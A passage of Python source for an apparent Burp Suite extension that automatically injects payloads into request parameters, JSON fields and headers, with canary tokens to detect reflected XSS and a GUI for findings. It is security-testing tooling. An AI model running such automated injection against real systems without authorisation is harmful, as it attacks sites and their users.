                        json_object, path, payload
                    )
                    if injected_body_text is None:
                        continue
                    injected_body_bytes = self.helpers.stringToBytes(
                        injected_body_text
                    )
                    new_headers = self._set_content_length(
                        self._ensure_ignore_header(headers),
                        injected_body_bytes
                    )
                    request_built = self.helpers.buildHttpMessage(
                        new_headers, injected_body_bytes
                    )
                    out.append(Injection(
                        Injection.KIND_JSON, format_json_path(path),
                        URL.PARAM_JSON,
                        payload, canary, request_built
                    ))

        # Header injection.
        if config["inject_headers"]:
            for header_name in config["header_names"]:
                if not header_name:
                    continue
                if header_name.lower() in NEVER_INJECT_HEADERS:
                    continue
                payload, canary = self._render(
                    header_name, host, config
                )
                new_headers = list(headers)
                new_headers.append("%s: %s" % (header_name, payload))
                new_headers = self._ensure_ignore_header(new_headers)
                new_headers = self._set_content_length(new_headers, body)
                injected = self.helpers.buildHttpMessage(new_headers, body)
                out.append(Injection(
                    Injection.KIND_HEADER, header_name, None,
                    payload, canary, injected
                ))

        return out

    # ---- payload rendering ------------------------------------------------

    def _render(self, where_name, host, config):
        payloads = config["payloads"]
        if not payloads:
            return None, None
        if config["randomize"]:
            payload = payloads[randint(0, len(payloads) - 1)]
        else:
            payload = payloads[0]

        canary = None
        if "$(canary)" in payload or config["append_canary"]:
            canary = self.canary.make()

        if canary and "$(canary)" in payload:
            payload = payload.replace("$(canary)", canary)
        if "$(uuid)" in payload:
            payload = payload.replace("$(uuid)", str(UUID.randomUUID()))
        if "$(random)" in payload:
            payload = payload.replace(
                "$(random)",
                "".join(choice(string.hexdigits.lower()) for _ in range(8))
            )
        if "$(time)" in payload:
            payload = payload.replace("$(time)",
                                      str(int(time.time() * 1000)))
        if "$(host)" in payload:
            payload = payload.replace("$(host)", host or "")
        if "$(param)" in payload:
            payload = payload.replace("$(param)", where_name or "")

        if canary and canary not in payload:
            # Always make sure the canary appears at least once so detection
            # has something to match on.
            payload = payload + canary

        return payload, canary

    # ---- param injection --------------------------------------------------

    def _inject_param(self, request_bytes, param, payload, auto_encode):
        if payload is None:
            return None
        if auto_encode:
            try:
                updated = self.helpers.buildParameter(
                    param.getName(), payload, param.getType()
                )
                return self.helpers.updateParameter(request_bytes, updated)
            except Exception:
                return None
        # Raw mode: rebuild request string.
        return self._update_param_raw(request_bytes, param, payload)

    def _update_param_raw(self, request_bytes, param, payload):
        try:
            request_str = self.helpers.bytesToString(request_bytes)
        except Exception:
            return None
        marker = "\r\n\r\n"
        idx = request_str.find(marker)
        if idx == -1:
            return None
        header_text = request_str[:idx]
        body_text = request_str[idx + len(marker):]
        lines = header_text.split("\r\n")
        if not lines:
            return None
        request_line = lines[0]
        parts = request_line.split(" ")
        if len(parts) < 2:
            return None

        name = param.getName()
        ptype = param.getType()
        if ptype == URL.PARAM_URL:
            path = parts[1]
            if "?" not in path:
                return None
            base, query = path.split("?", 1)
            new_query, replaced = self._replace_kv(query, name, payload)
            if not replaced:
                return None
            parts[1] = base + "?" + new_query
            lines[0] = " ".join(parts)
            return self.helpers.stringToBytes(
                "\r\n".join(lines) + marker + body_text
            )
        if ptype == URL.PARAM_BODY:
            if not body_text:
                return None
            new_body, replaced = self._replace_kv(body_text, name, payload)
            if not replaced:
                return None
            return self.helpers.stringToBytes(
                header_text + marker + new_body
            )
        return None

    def _replace_kv(self, text, name, payload):
        if not text:
            return text, False
        segments = text.split("&")
        new_segments = []
        replaced = False
        for seg in segments:
            if "=" in seg:
                k, _ = seg.split("=", 1)
                if k == name:
                    new_segments.append(k + "=" + payload)
                    replaced = True
                else:
                    new_segments.append(seg)
            else:
                if seg == name:
                    new_segments.append(name + "=" + payload)
                    replaced = True
                else:
                    new_segments.append(seg)
        return "&".join(new_segments), replaced

    # ---- json walking -----------------------------------------------------

    def _maybe_parse_json(self, headers, body_text, strings_only):
        ct = ""
        for h in headers:
            if h.lower().startswith("content-type:"):
                ct = h.split(":", 1)[1].strip().lower()
                break
        sample = body_text.lstrip() if body_text else ""
        looks_json = ("json" in ct or
                      sample.startswith("{") or
                      sample.startswith("["))
        if not looks_json:
            return None, [], False
        try:
            obj = json.loads(body_text)
        except Exception:
            return None, [], True
        paths = self._json_collect_paths(obj, strings_only)
        return obj, paths, False

    def _json_collect_paths(self, obj, strings_only):
        paths = []

        def walk(node, path):
            if isinstance(node, dict):
                for k, v in node.items():
                    walk(v, path + [k])
            elif isinstance(node, list):
                for i, v in enumerate(node):
                    walk(v, path + [i])
            else:
                if strings_only and not isinstance(node, basestring):
                    return
                paths.append(path)
        walk(obj, [])
        return paths

    def _json_inject(self, obj, path, payload):
        try:
            clone = json.loads(json.dumps(obj))
        except Exception:
            return None
        if not path:
            return json.dumps(payload)
        cursor = clone
        for key in path[:-1]:
            cursor = cursor[key]
        cursor[path[-1]] = payload
        return json.dumps(clone)

    # ---- header helpers ---------------------------------------------------

    def _has_ignore_header(self, headers):
        target = OP_IGNORE_HEADER.lower()
        for h in headers:
            parts = h.split(":", 1)
            if len(parts) != 2:
                continue
            name = parts[0].strip().lower()
            value = parts[1].strip().lower()
            if name == target and value == "yes":
                return True
        return False

    def _ensure_ignore_header(self, headers):
        if self._has_ignore_header(headers):
            return list(headers)
        new = list(headers)
        new.append("%s: yes" % OP_IGNORE_HEADER)
        return new

    def _ensure_ignore_header_bytes(self, request_bytes):
        """For requests produced by `updateParameter` we need to inject the
        ignore header into the already-built bytes."""
        try:
            info = self.helpers.analyzeRequest(request_bytes)
            headers = list(info.getHeaders())
            body = request_bytes[info.getBodyOffset():]
        except Exception:
            return request_bytes  # best effort
        if self._has_ignore_header(headers):
            return request_bytes
        headers.append("%s: yes" % OP_IGNORE_HEADER)
        try:
            return self.helpers.buildHttpMessage(headers, body)
        except Exception:
            return request_bytes

    def _has_chunked(self, headers):
        for h in headers:
            if h.lower().startswith("transfer-encoding:") and "chunked" in h.lower():
                return True
        return False

    def _set_content_length(self, headers, body_bytes):
        if self._has_chunked(headers):
            return list(headers)
        try:
            length = len(body_bytes)
        except Exception:
            length = 0
        new = []
        has_length = False
        for h in headers:
            if h.lower().startswith("content-length:"):
                new.append("Content-Length: %d" % length)
                has_length = True
            else:
                new.append(h)
        if not has_length and length > 0:
            new.append("Content-Length: %d" % length)
        return new


# ---------------------------------------------------------------------------
# Table models (thread-safe via EDT)
# ---------------------------------------------------------------------------

class _BoundedListModel(AbstractTableModel):
    """Common helper: bounded list-of-rows backing model."""

    def __init__(self, columns, max_rows):
        self._columns = columns
        self._max_rows = max_rows
        self._rows = []     # newest at index 0

    def getColumnCount(self):
        return len(self._columns)

    def getColumnName(self, col):
        return self._columns[col]

    def getRowCount(self):
        return len(self._rows)

    def getValueAt(self, row, col):
        if 0 <= row < len(self._rows) and 0 <= col < len(self._columns):
            return self._rows[row][col]
        return ""

    def isCellEditable(self, row, col):
        return False

    def add_row(self, row):
        # Always called from EDT (we post via _run_on_ui).
        self._rows.insert(0, row)
        self.fireTableRowsInserted(0, 0)
        if len(self._rows) > self._max_rows:
            removed_from = len(self._rows) - 1
            self._rows.pop()
            self.fireTableRowsDeleted(removed_from, removed_from)

    def clear(self):
        n = len(self._rows)
        self._rows = []
        if n:
            self.fireTableRowsDeleted(0, n - 1)

    def all_rows(self):
        return list(self._rows)


class ActivityModel(_BoundedListModel):
    COLUMNS = ["Time", "ReqID", "Host", "Method", "Path",
               "Type", "Where", "Status", "Size", "Notes"]

    def __init__(self):
        _BoundedListModel.__init__(self, self.COLUMNS, ACTIVITY_LOG_MAX)


class FindingsModel(AbstractTableModel):
    COLUMNS = ["Time", "Severity", "Host", "Method", "Path",
               "Type", "Where", "Context", "Status",
               "Size", "Payload", "Canary", "FP"]

    def __init__(self):
        AbstractTableModel.__init__(self)
        self._findings = []   # list[Finding], newest first

    def getColumnCount(self):
        return len(self.COLUMNS)

    def getColumnName(self, col):
        return self.COLUMNS[col]

    def getRowCount(self):
        return len(self._findings)

    def getValueAt(self, row, col):
        if not (0 <= row < len(self._findings)):
            return ""
        f = self._findings[row]
        return self._cell(f, col)

    def isCellEditable(self, row, col):
        return False

    def _cell(self, f, col):
        if col == 0: return f.time_str
        if col == 1: return f.severity
        if col == 2: return f.host
        if col == 3: return f.method
        if col == 4: return f.path
        if col == 5: return f.kind
        if col == 6: return f.where
        if col == 7: return f.context
        if col == 8: return f.status_code
        if col == 9: return f.size
        if col == 10: return truncate(f.payload, 120)
        if col == 11: return f.canary
        if col == 12: return "yes" if f.false_positive else ""
        return ""

    def add(self, finding):
        self._findings.insert(0, finding)
        self.fireTableRowsInserted(0, 0)
        if len(self._findings) > FINDINGS_MAX:
            self._findings.pop()
            removed = len(self._findings)
            self.fireTableRowsDeleted(removed, removed)

    def remove_at(self, row):
        if 0 <= row < len(self._findings):
            self._findings.pop(row)
            self.fireTableRowsDeleted(row, row)

    def mark_fp_at(self, row, fp=True):
        if 0 <= row < len(self._findings):
            self._findings[row].false_positive = fp
            self.fireTableRowsUpdated(row, row)

    def clear(self):
        n = len(self._findings)
        self._findings = []
        if n:
            self.fireTableRowsDeleted(0, n - 1)

    def at(self, row):
        if 0 <= row < len(self._findings):
            return self._findings[row]
        return None

    def all(self):
        return list(self._findings)

    def replace_all(self, findings):
        n = len(self._findings)
        self._findings = list(findings)
        if n:
            self.fireTableRowsDeleted(0, n - 1)
        if self._findings:
            self.fireTableRowsInserted(0, len(self._findings) - 1)


class _SeverityRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, sel, focus,
                                      row, col):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, sel, focus, row, col
        )
        color = SEVERITY_COLORS.get(str(value))
        if color is not None and not sel:
            c.setForeground(color)
        return c


# ---------------------------------------------------------------------------
# GUI - tabbed layout with Settings / Activity / Findings
# ---------------------------------------------------------------------------

class GUI(object):

    MAX_LOG_ROWS = ACTIVITY_LOG_MAX
    PAYLOAD_PREVIEW_LIMIT = 120

    def __init__(self):
        self.callbacks = None
        self.extender = None
        self.activity_model = ActivityModel()
        self.findings_model = FindingsModel()

    # ---- thread / EDT helpers --------------------------------------------

    def _run_on_ui(self, fn):
        class _R(Runnable):
            def __init__(self, f):
                self.f = f

            def run(self):
                try:
                    self.f()
                except Exception:
                    pass
        SwingUtilities.invokeLater(_R(fn))

    # ---- builders ---------------------------------------------------------

    def _titled(self, title, body):
        body.setBorder(BorderFactory.createTitledBorder(title))
        return body

    def _v_panel(self, *items):
        p = JPanel()
        p.setLayout(BoxLayout(p, BoxLayout.Y_AXIS))
        for item in items:
            p.add(item)
        return p

    def _row(self, *items):
        r = JPanel(FlowLayout(FlowLayout.LEFT))
        for item in items:
            r.add(item)
        return r

    def _text_area(self, rows):
        a = JTextArea(rows, 40)
        a.setLineWrap(True)
        a.setWrapStyleWord(True)
        return a

    # ---- sections ---------------------------------------------------------

    def _section_general(self):
        self.enable = JCheckBox("Enable scanning")
        self.randomize = JCheckBox("Randomize payloads")
        self.inject_headers = JCheckBox("Inject headers")
        self.inject_json = JCheckBox("Inject JSON body")
        self.json_strings_only = JCheckBox("JSON: only string values")
        self.verbose_activity = JCheckBox("Verbose activity")
        self.auto_encode = JCheckBox("Auto-encode payloads")
        self.in_scope_only = JCheckBox("In-scope only")
        self.detect_reflections = JCheckBox("Detect reflected XSS")
        self.append_canary = JCheckBox("Append canary token to payloads")
        self.add_to_site_map = JCheckBox("Mark hits in Site Map")
        self.add_to_site_map.setToolTipText(
            "On every reflection, apply markers and add the wrapped "
            "request/response to Burp's Site Map.  Burp's native viewers "
            "will then highlight the canary inline."
        )

        row1 = self._row(
            self.enable, self.detect_reflections,
            self.randomize, self.auto_encode, self.in_scope_only,
        )
        row2 = self._row(
            self.inject_headers, self.inject_json,
            self.json_strings_only, self.append_canary,
            self.add_to_site_map, self.verbose_activity,
        )

        self.rate_limit = JTextField("0", 6)
        self.rate_limit.setToolTipText(
            "Milliseconds between requests per host (0 = off)."
        )
        self.dedup_ms = JTextField(str(DEFAULT_DEDUP_COOLDOWN_MS), 7)
        self.dedup_ms.setToolTipText(
            "Skip identical request shapes seen within N ms (0 = off)."
        )
        self.pool_size = JTextField(str(DEFAULT_POOL_SIZE), 4)
        self.pool_size.setToolTipText("Worker threads.")
        self.queue_size = JTextField(str(DEFAULT_QUEUE_SIZE), 5)
        self.queue_size.setToolTipText("Max queued injections.")
        self.per_host_permits = JTextField(str(DEFAULT_PER_HOST_PERMITS), 3)
        self.per_host_permits.setToolTipText("Concurrent in-flight per host.")
        self.max_body_size = JTextField(str(DEFAULT_MAX_BODY_SIZE), 8)
        self.max_body_size.setToolTipText(
            "Skip request body injection above this byte size."
        )

        row3 = self._row(
            JLabel("Rate (ms/host):"), self.rate_limit,
            JLabel("  Dedup (ms):"), self.dedup_ms,
            JLabel("  Workers:"), self.pool_size,
            JLabel("  Queue:"), self.queue_size,
            JLabel("  Per-host:"), self.per_host_permits,
            JLabel("  Max body:"), self.max_body_size,
        )

        body = self._v_panel(row1, row2, row3)
        return self._titled("General", body)

    def _section_payloads(self):
        outer = JPanel(BorderLayout())
        top = self._row(JLabel("Template:"))
        self.payload_template = JComboBox([t[0] for t in PAYLOAD_TEMPLATES])
        top.add(self.payload_template)
        add_btn = JButton("Add", actionPerformed=self._on_add_template)
        top.add(add_btn)
        outer.add(top, BorderLayout.NORTH)
        self.payloads_list = self._text_area(7)
        outer.add(JScrollPane(self.payloads_list), BorderLayout.CENTER)
        outer.setBorder(BorderFactory.createTitledBorder(
            "Payloads (line separated; placeholders: $(canary) $(uuid) "
            "$(random) $(time) $(host) $(param))"
        ))
        return outer

    def _section_headers(self):
        outer = JPanel(BorderLayout())
        self.headers_list = self._text_area(4)
        outer.add(JScrollPane(self.headers_list), BorderLayout.CENTER)
        outer.setBorder(BorderFactory.createTitledBorder(
            "Header injection list (line separated)"
        ))
        return outer

    def _section_exclusions(self):
        outer = JPanel(BorderLayout())
        self.exclusions_grid = JPanel(GridLayout(1, 3, 8, 0))

        hosts_panel = JPanel(BorderLayout())
        hosts_panel.add(JLabel("Hosts"), BorderLayout.NORTH)
        self.exclude_hosts_list = self._text_area(4)
        hosts_panel.add(JScrollPane(self.exclude_hosts_list),
                        BorderLayout.CENTER)

        paths_panel = JPanel(BorderLayout())
        paths_panel.add(JLabel("Paths"), BorderLayout.NORTH)
        self.exclude_paths_list = self._text_area(4)
        paths_panel.add(JScrollPane(self.exclude_paths_list),
                        BorderLayout.CENTER)

        params_panel = JPanel(BorderLayout())
        params_panel.add(JLabel("Params"), BorderLayout.NORTH)
        self.exclude_params_list = self._text_area(4)
        params_panel.add(JScrollPane(self.exclude_params_list),
                        BorderLayout.CENTER)

        self.exclusions_grid.add(hosts_panel)
        self.exclusions_grid.add(paths_panel)
        self.exclusions_grid.add(params_panel)
        outer.add(self.exclusions_grid, BorderLayout.CENTER)
        outer.setBorder(BorderFactory.createTitledBorder("Exclusions"))
        return outer

    def _build_settings_footer(self):
        """Sticky toolbar at the bottom of the Settings tab.

        Save and Reload live here so they're always reachable regardless of
        scroll position.  The inline validation status sits to the right of
        the buttons so warnings are visible without an extra titled section.
        """
        self.save_btn = JButton(
            "Save settings",
            actionPerformed=lambda e: self.save_settings(),
        )
        self.save_btn.setToolTipText(
            "Persist current settings and apply them to the running pool."
        )
        self.reload_btn = JButton(
            "Reload",
            actionPerformed=lambda e: self.load_settings(),
        )
        self.reload_btn.setToolTipText(
            "Discard unsaved edits and reload settings from storage."
        )
        self.validation_label = JLabel(" ")

        footer = JPanel(BorderLayout())
        left = JPanel(FlowLayout(FlowLayout.LEFT, 6, 4))
        left.add(self.save_btn)
        left.add(self.reload_btn)
        footer.add(left, BorderLayout.WEST)

        right = JPanel(FlowLayout(FlowLayout.RIGHT, 6, 4))
        right.add(self.validation_label)
        footer.add(right, BorderLayout.EAST)

        footer.setBorder(BorderFactory.createMatteBorder(
            1, 0, 0, 0, Color(0xCC, 0xCC, 0xCC)
        ))
        return footer

    # ---- main tab builders -----------------------------------------------

    def _build_settings_tab(self):
        wrap = JPanel(GridBagLayout())
        c = GridBagConstraints()
        c.gridx = 0
        c.weightx = 1.0
        c.insets = Insets(6, 6, 6, 6)
        c.fill = GridBagConstraints.HORIZONTAL

        sections = [
            (self._section_general(),    0.0, GridBagConstraints.HORIZONTAL),
            (self._section_payloads(),   0.6, GridBagConstraints.BOTH),
            (self._section_headers(),    0.2, GridBagConstraints.BOTH),
            (self._section_exclusions(), 0.2, GridBagConstraints.BOTH),
        ]
        for i, (sec, wy, fill) in enumerate(sections):
            c.gridy = i
            c.weighty = wy
            c.fill = fill
            wrap.add(sec, c)

        scroll = JScrollPane(wrap)
        scroll.getVerticalScrollBar().setUnitIncrement(12)
        scroll.setHorizontalScrollBarPolicy(
            JScrollPane.HORIZONTAL_SCROLLBAR_NEVER
        )
        scroll.setBorder(BorderFactory.createEmptyBorder())

        outer = JPanel(BorderLayout())
        outer.add(scroll, BorderLayout.CENTER)
        outer.add(self._build_settings_footer(), BorderLayout.SOUTH)
        return outer

    def _build_activity_tab(self):
        outer = JPanel(BorderLayout())

        top = JPanel(FlowLayout(FlowLayout.LEFT))
        top.add(JLabel("Filter:"))
        self.activity_filter = JTextField("", 32)
        top.add(self.activity_filter)
        clear_btn = JButton("Clear",
                            actionPerformed=lambda e:
                            self._run_on_ui(self.activity_model.clear))
        top.add(clear_btn)
        outer.add(top, BorderLayout.NORTH)

        self.activity_table = JTable(self.activity_model)
        sorter = TableRowSorter(self.activity_model)
        self.activity_table.setRowSorter(sorter)
        self.activity_table.setAutoCreateRowSorter(False)

        def _on_filter_change():
            text = self.activity_filter.getText()
            if not text:
                sorter.setRowFilter(None)
            else:
                try:
                    sorter.setRowFilter(RowFilter.regexFilter("(?i)" + text))
                except Exception:
                    sorter.setRowFilter(None)

        self.activity_filter.getDocument().addDocumentListener(
            _SimpleDocListener(_on_filter_change)
        )

        outer.add(JScrollPane(self.activity_table), BorderLayout.CENTER)
        return outer

    def _build_findings_tab(self):
        outer = JPanel(BorderLayout())

        top = JPanel(FlowLayout(FlowLayout.LEFT))
        top.add(JLabel("Filter:"))
        self.findings_filter = JTextField("", 32)
        top.add(self.findings_filter)
        export_btn = JButton("Export CSV",
                             actionPerformed=lambda e: self._on_export_csv())
        clear_btn = JButton("Clear findings",
                            actionPerformed=lambda e: self._on_clear_findings())
        top.add(export_btn)
        top.add(clear_btn)
        self.findings_count_label = JLabel("0 findings")
        top.add(self.findings_count_label)
        outer.add(top, BorderLayout.NORTH)

        self.findings_table = JTable(self.findings_model)
        sorter = TableRowSorter(self.findings_model)
        self.findings_table.setRowSorter(sorter)

        # Severity column custom rendering.
        sev_col = self.findings_table.getColumnModel().getColumn(1)
        sev_col.setCellRenderer(_SeverityRenderer())

        def _on_filter_change():
            text = self.findings_filter.getText()
            if not text:
                sorter.setRowFilter(None)
            else:
                try:
                    sorter.setRowFilter(RowFilter.regexFilter("(?i)" + text))
                except Exception:
                    sorter.setRowFilter(None)
        self.findings_filter.getDocument().addDocumentListener(
            _SimpleDocListener(_on_filter_change)
        )

        popup = JPopupMenu()
        popup.add(JMenuItem("Copy URL",
                            actionPerformed=lambda e: self._on_copy_url()))
        popup.add(JMenuItem("Copy as curl",
                            actionPerformed=lambda e: self._on_copy_curl()))
        popup.add(JMenuItem("Copy payload",
                            actionPerformed=lambda e: self._on_copy_payload()))
        popup.addSeparator()
        popup.add(JMenuItem("Send to Repeater",
                            actionPerformed=lambda e: self._on_send_repeater()))
        popup.add(JMenuItem("Send to Intruder",
                            actionPerformed=lambda e: self._on_send_intruder()))
        popup.addSeparator()
        popup.add(JMenuItem("Mark / unmark false positive",
                            actionPerformed=lambda e: self._on_mark_fp()))
        popup.add(JMenuItem("Delete row",
                            actionPerformed=lambda e: self._on_delete_finding()))

        owner = self

        class _RightClick(MouseAdapter):
            def mousePressed(self, e):
                self._maybe(e)

            def mouseReleased(self, e):
                self._maybe(e)

            def _maybe(self, e):
                if e.isPopupTrigger():
                    view_row = owner.findings_table.rowAtPoint(e.getPoint())
                    if view_row != -1:
                        owner.findings_table.setRowSelectionInterval(
                            view_row, view_row
                        )
                    popup.show(e.getComponent(), e.getX(), e.getY())

        self.findings_table.addMouseListener(_RightClick())

        outer.add(JScrollPane(self.findings_table), BorderLayout.CENTER)
        return outer

    def gui(self):
        self.panel = JPanel(BorderLayout())
        tabs = JTabbedPane()
        tabs.addTab("Settings", self._build_settings_tab())
        tabs.addTab("Activity", self._build_activity_tab())
        tabs.addTab("Findings", self._build_findings_tab())
        self.panel.add(tabs, BorderLayout.CENTER)

        self.status_label = JLabel("Ready")
        status_panel = JPanel(BorderLayout())
        status_panel.add(self.status_label, BorderLayout.WEST)
        self.panel.add(status_panel, BorderLayout.SOUTH)

        owner = self

        class _ResizeAdapter(ComponentAdapter):
            def componentResized(self, event):
                width = owner.panel.getWidth()
                if width <= 700:
                    owner.exclusions_grid.setLayout(GridLayout(3, 1, 8, 8))
                else:
                    owner.exclusions_grid.setLayout(GridLayout(1, 3, 8, 0))
                owner.exclusions_grid.revalidate()
                owner.exclusions_grid.repaint()

        self.panel.addComponentListener(_ResizeAdapter())
        return self

    # ---- popup actions ----------------------------------------------------

    def _selected_finding(self):
        view_row = self.findings_table.getSelectedRow()
        if view_row < 0:
            return None
        model_row = self.findings_table.convertRowIndexToModel(view_row)
        return self.findings_model.at(model_row), model_row

    def _on_copy_url(self):
        sel = self._selected_finding()
        if not sel:
            return
        f, _ = sel
        scheme = "https" if f.https else "http"
        url = "%s://%s%s%s" % (
            scheme,
            f.host,
            "" if (f.https and f.port == 443) or (not f.https and f.port == 80)
                else ":%d" % f.port,
            f.path,
        )
        self._clipboard(url)

    def _on_copy_payload(self):
        sel = self._selected_finding()
        if not sel:
            return
        f, _ = sel
        self._clipboard(f.payload)

    def _on_copy_curl(self):
        sel = self._selected_finding()
        if not sel:
            return
        f, _ = sel
        req = _b64_to_bytes(f.injected_request_b64)
        text = ""
        if req is not None:
            try:
                text = "".join(chr(b & 0xFF) for b in req[:8192])
            except Exception:
                text = ""
        scheme = "https" if f.https else "http"
        url = "%s://%s%s" % (scheme, f.host, f.path)
        cmd = "curl -i -k -X %s %s" % (f.method, _shell_quote(url))
        self._clipboard(cmd + "\n# Injected request (first 8KB):\n" + text)

    def _on_send_repeater(self):
        sel = self._selected_finding()
        if not sel or self.callbacks is None:
            return
        f, _ = sel
        try:
            req = _b64_to_bytes(f.injected_request_b64)
            if req is None:
                self.set_status("Send to Repeater: no stored request")
                return
            tab_name = "bb-%s" % (f.canary[:6] if f.canary else "x")
            self.callbacks.sendToRepeater(
                f.host, f.port, f.https, req, tab_name
            )
        except Exception as exc:
            self.set_status("Send to Repeater failed: %s" % exc)

    def _on_send_intruder(self):
        sel = self._selected_finding()
        if not sel or self.callbacks is None:
            return
        f, _ = sel
        try:
            req = _b64_to_bytes(f.injected_request_b64)
            if req is None:
                self.set_status("Send to Intruder: no stored request")
                return
            self.callbacks.sendToIntruder(
                f.host, f.port, f.https, req
            )
        except Exception as exc:
            self.set_status("Send to Intruder failed: %s" % exc)

    def _on_mark_fp(self):
        sel = self._selected_finding()
        if not sel:
            return
        _, model_row = sel
        f = self.findings_model.at(model_row)
        self.findings_model.mark_fp_at(model_row, not f.false_positive)
        if self.extender is not None:
            self.extender.persist_findings_throttled()

    def _on_delete_finding(self):
        sel = self._selected_finding()
        if not sel:
            return
        _, model_row = sel
        self.findings_model.remove_at(model_row)
        self._refresh_findings_count()
        if self.extender is not None:
            self.extender.persist_findings_throttled()

    def _on_clear_findings(self):
        result = JOptionPane.showConfirmDialog(
            self.panel,
            "Clear all %d findings?" % self.findings_model.getRowCount(),
            "Clear findings",
            JOptionPane.OK_CANCEL_OPTION,
        )
        if result == JOptionPane.OK_OPTION:
            self.findings_model.clear()
            self._refresh_findings_count()
            if self.extender is not None:
                self.extender.persist_findings_throttled()

    def _on_export_csv(self):
        chooser = JFileChooser()
        chooser.setSelectedFile(File("bitblinder-findings.csv"))
        result = chooser.showSaveDialog(self.panel)
        if result != JFileChooser.APPROVE_OPTION:
            return
        path = chooser.getSelectedFile().getAbsolutePath()
        try:
            self._write_csv(path, self.findings_model.all())
            self.set_status("Exported %d findings to %s"
                            % (self.findings_model.getRowCount(), path))
        except Exception as exc:
            self.set_status("Export failed: %s" % exc)

    def _write_csv(self, path, findings):
        cols = [
            "Time", "Severity", "Host", "Port", "Method", "Path",
            "Type", "Where", "Context", "Status", "Size", "Payload",
            "Canary", "Excerpt", "FalsePositive",
        ]
        out = FileOutputStream(File(path))
        try:
            w = OutputStreamWriter(out, "UTF-8")
            try:
                w.write(",".join(cols))
                w.write("\r\n")
                for f in findings:
                    row = [
                        f.time_str, f.severity, f.host, f.port,
                        f.method, f.path, f.kind, f.where, f.context,
                        f.status_code, f.size, f.payload, f.canary,
                        f.excerpt, "yes" if f.false_positive else "no",
                    ]
                    w.write(",".join(csv_quote(v) for v in row))
                    w.write("\r\n")
            finally:
                w.flush()
                w.close()
        finally:
            try:
                out.close()
            except Exception:
                pass

    def _clipboard(self, text):
        try:
            sel = StringSelection(text or "")
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(
                sel, None
            )
        except Exception:
            pass

    # ---- template insertion ----------------------------------------------

    def _on_add_template(self, event=None):
        idx = self.payload_template.getSelectedIndex()
        if idx < 0:
            return
        payload = PAYLOAD_TEMPLATES[idx][1]
        current = self.payloads_list.getText().strip()
        if current:
            self.payloads_list.setText(current + "\n" + payload)
        else:
            self.payloads_list.setText(payload)
        self.update_validation()

    # ---- accessors --------------------------------------------------------

    def get_payloads(self):
        return normalize_lines(self.payloads_list.getText())

    def get_header_names(self):
        return normalize_lines(self.headers_list.getText())

    def get_exclude_hosts(self):
        return normalize_lines(self.exclude_hosts_list.getText())

    def get_exclude_paths(self):
        return normalize_lines(self.exclude_paths_list.getText())

    def get_exclude_params(self):
        return normalize_lines(self.exclude_params_list.getText())

    def get_rate_limit_ms(self):
        v = safe_int(self.rate_limit.getText(), 0)
        return max(0, v)

    def get_dedup_ms(self):
        return max(0, safe_int(self.dedup_ms.getText(),
                               DEFAULT_DEDUP_COOLDOWN_MS))

    def get_pool_size(self):
        return max(1, safe_int(self.pool_size.getText(), DEFAULT_POOL_SIZE))

    def get_queue_size(self):
        return max(1, safe_int(self.queue_size.getText(),
                               DEFAULT_QUEUE_SIZE))

    def get_per_host_permits(self):
        return max(1, safe_int(self.per_host_permits.getText(),
                               DEFAULT_PER_HOST_PERMITS))

    def get_max_body_size(self):
        return max(1024, safe_int(self.max_body_size.getText(),
                                  DEFAULT_MAX_BODY_SIZE))

    def get_inject_json(self):
        return self.inject_json.isSelected()

    def get_json_strings_only(self):
        return self.json_strings_only.isSelected()

    def get_verbose_activity(self):
        return self.verbose_activity.isSelected()

    def get_auto_encode(self):
        return self.auto_encode.isSelected()

    def get_in_scope_only(self):
        return self.in_scope_only.isSelected()

    def get_detect_reflections(self):
        return self.detect_reflections.isSelected()

    def get_append_canary(self):
        return self.append_canary.isSelected()

    def get_add_to_site_map(self):
        return self.add_to_site_map.isSelected()

    # ---- save / load ------------------------------------------------------

    def save_settings(self, event=None):
        cfg = DEFAULT_CONFIG.copy()
        cfg["ConfigVersion"] = CONFIG_VERSION
        cfg["Randomize"] = self.randomize.isSelected()
        cfg["Payloads"] = self.get_payloads()
        cfg["isEnabled"] = self.enable.isSelected()
        cfg["InjectHeaders"] = self.inject_headers.isSelected()
        cfg["InjectJson"] = self.get_inject_json()
        cfg["JsonStringsOnly"] = self.get_json_strings_only()
        cfg["VerboseActivity"] = self.get_verbose_activity()
        cfg["AutoEncode"] = self.get_auto_encode()
        cfg["InScopeOnly"] = self.get_in_scope_only()
        cfg["DetectReflections"] = self.get_detect_reflections()
        cfg["AppendCanary"] = self.get_append_canary()
        cfg["AddToSiteMap"] = self.get_add_to_site_map()
        cfg["Headers"] = self.get_header_names()
        cfg["ExcludeHosts"] = self.get_exclude_hosts()
        cfg["ExcludePaths"] = self.get_exclude_paths()
        cfg["ExcludeParams"] = self.get_exclude_params()
        cfg["RateLimitMs"] = self.get_rate_limit_ms()
        cfg["DedupCooldownMs"] = self.get_dedup_ms()
        cfg["PoolSize"] = self.get_pool_size()
        cfg["QueueSize"] = self.get_queue_size()
        cfg["PerHostPermits"] = self.get_per_host_permits()
        cfg["MaxBodySize"] = self.get_max_body_size()

        try:
            if not self.callbacks:
                raise Exception("Burp callbacks not set")
            self.callbacks.saveExtensionSetting(CONFIG_KEY,
                                                json.dumps(cfg))
            self.set_status("Settings saved")
            self.update_validation()
            if self.extender is not None:
                self.extender.apply_config_changes(cfg)
        except Exception as exc:
            self.set_status("Failed to save settings: %s" % exc)

    def load_settings(self, event=None):
        cfg = DEFAULT_CONFIG.copy()
        try:
            if not self.callbacks:
                raise Exception("Burp callbacks not set")
            raw = self.callbacks.loadExtensionSetting(CONFIG_KEY)
            if raw:
                loaded = json.loads(raw)
                cfg.update(loaded)
                # If older version, write back so subsequent reads are clean.
                if loaded.get("ConfigVersion", 0) < CONFIG_VERSION:
                    self.callbacks.saveExtensionSetting(
                        CONFIG_KEY, json.dumps(cfg)
                    )
                self.set_status("Settings loaded")
            self.update_validation()
        except Exception as exc:
            self.set_status("Failed to load settings: %s" % exc)

        self.enable.setSelected(bool(cfg.get("isEnabled", False)))
        self.randomize.setSelected(bool(cfg.get("Randomize", False)))
        self.payloads_list.setText("\n".join(cfg.get("Payloads", [])))
        self.inject_headers.setSelected(bool(cfg.get("InjectHeaders", False)))
        self.inject_json.setSelected(bool(cfg.get("InjectJson", True)))
        self.json_strings_only.setSelected(
            bool(cfg.get("JsonStringsOnly", True))
        )
        self.verbose_activity.setSelected(
            bool(cfg.get("VerboseActivity", True))
        )
